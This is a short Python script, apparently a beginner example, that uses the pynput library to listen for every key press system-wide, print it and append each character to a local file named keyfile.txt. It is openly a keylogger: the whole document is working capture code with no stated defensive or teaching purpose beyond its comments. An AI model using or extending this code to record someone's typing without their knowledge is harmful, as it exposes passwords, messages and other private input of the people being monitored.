from pynput import keyboard

def KeyPressed(key):
    print(str(key))

    # Use this to open txt file, whether it's created or not.
    # Utilize 'a' option to append to file.
    with open("keyfile.txt", 'a') as logkey:
        try:
            #Convert key to a character
            char = key.char
            # write character to txt file
            logkey.write(char)
        except:
            print("Error getting char")

if __name__ == "__main__":
    # Every time a key is pressed pass the data to keypressed
    listener = keyboard.Listener(on_press=KeyPressed)
    listener.start()
    input()